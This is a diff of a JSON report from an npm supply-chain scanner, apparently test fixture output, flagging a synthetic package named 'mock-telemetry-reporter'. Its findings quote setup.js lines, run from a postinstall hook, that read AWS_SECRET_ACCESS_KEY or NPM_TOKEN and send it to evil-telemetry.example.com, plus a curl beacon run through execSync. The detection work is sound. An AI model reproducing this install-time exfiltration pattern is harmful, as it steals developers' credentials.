@@ -1,6 +1,6 @@
 {
   "schemaVersion": "1.0",
-  "runId": "run-1790498532047-wfpbom",
+  "runId": "run-1790506603504-76wa0x",
   "mode": "fixture",
   "subjectDigest": "8c25337c586380ee70dd7aa67bb9c9ead5790defaf62183485523ac9ca6dfd27",
   "scannerVersion": "0.1.0",
@@ -21,9 +21,19 @@
       "integrity": "sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz==",
       "previousIntegrity": null,
       "hasInstallScript": true,
-      "scripts": null,
+      "scripts": {
+        "postinstall": "node setup.js"
+      },
       "unsupported": false,
-      "unsupportedReason": null
+      "unsupportedReason": null,
+      "provenance": {
+        "publishedAt": "2026-09-01T00:00:00.000Z",
+        "maintainersCount": 1,
+        "repositoryUrl": "https://github.com/example/mock-repo",
+        "hasAttestation": false,
+        "tarballUrl": "https://registry.npmjs.org/mock-telemetry-reporter/-/mock-telemetry-reporter-1.0.0.tgz",
+        "isSynthetic": true
+      }
     },
     {
       "name": "picocolors",
@@ -50,8 +60,53 @@
       "packageName": "mock-telemetry-reporter",
       "ruleId": "LIFECYCLE_SCRIPT_ADDED",
       "severity": "medium",
-      "evidenceRef": "package.json#scripts.install",
-      "explanation": "Package declares an install lifecycle script in lockfile v3 descriptors."
+      "evidenceRef": "package.json#scripts.postinstall",
+      "explanation": "Newly introduced lifecycle script \"postinstall\": \"node setup.js\". Review installation behavior."
+    },
+    {
+      "id": "obs-mock-telemetry-reporter-environment_access-2",
+      "packageLocation": "node_modules/mock-telemetry-reporter",
+      "packageName": "mock-telemetry-reporter",
+      "ruleId": "ENVIRONMENT_ACCESS",
+      "severity": "medium",
+      "evidenceRef": "setup.js#L3",
+      "explanation": "References environment variables which may access sensitive credentials at line 3: \"const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;\""
+    },
+    {
+      "id": "obs-mock-telemetry-reporter-network_operation-3",
+      "packageLocation": "node_modules/mock-telemetry-reporter",
+      "packageName": "mock-telemetry-reporter",
+      "ruleId": "NETWORK_OPERATION",
+      "severity": "medium",
+      "evidenceRef": "setup.js#L4",
+      "explanation": "Initiates network or socket operations at line 4: \"fetch(\"https://evil-telemetry.example.com/exfil?token=\" + encodeURIComponent(token || 'none'));\""
+    },
+    {
+      "id": "obs-mock-telemetry-reporter-network_operation-4",
+      "packageLocation": "node_modules/mock-telemetry-reporter",
+      "packageName": "mock-telemetry-reporter",
+      "ruleId": "NETWORK_OPERATION",
+      "severity": "medium",
+      "evidenceRef": "setup.js#L6",
+      "explanation": "Initiates network or socket operations at line 6: \"execSync(\"curl -s https://evil-telemetry.example.com/beacon\");\""
+    },
+    {
+      "id": "obs-mock-telemetry-reporter-process_execution-5",
+      "packageLocation": "node_modules/mock-telemetry-reporter",
+      "packageName": "mock-telemetry-reporter",
+      "ruleId": "PROCESS_EXECUTION",
+      "severity": "high",
+      "evidenceRef": "setup.js#L5",
+      "explanation": "Executes external system processes or shell commands at line 5: \"const { execSync } = require('child_process');\""
+    },
+    {
+      "id": "obs-mock-telemetry-reporter-process_execution-6",
+      "packageLocation": "node_modules/mock-telemetry-reporter",
+      "packageName": "mock-telemetry-reporter",
+      "ruleId": "PROCESS_EXECUTION",
+      "severity": "high",
+      "evidenceRef": "setup.js#L6",
+      "explanation": "Executes external system processes or shell commands at line 6: \"execSync(\"curl -s https://evil-telemetry.example.com/beacon\");\""
     }
   ],
   "unknowns": [
@@ -62,8 +117,14 @@
     {
       "sourceType": "fixture",
       "pathOrUrl": "fixture:mock-telemetry-reporter@1.0.0",
-      "retrievalTime": "2026-09-27T08:42:12.047Z",
+      "retrievalTime": "2026-09-27T10:56:43.505Z",
       "contentDigest": "sha512-mockSuspiciousIntegrityString1234567890abcdefghijklmnopqrstuvwxyz=="
+    },
+    {
+      "sourceType": "synthetic",
+      "pathOrUrl": "https://registry.npmjs.org/mock-telemetry-reporter",
+      "retrievalTime": "2026-09-27T10:56:43.506Z",
+      "contentDigest": "sha512-mockFixtureIntegrity=="
     }
   ]
 }
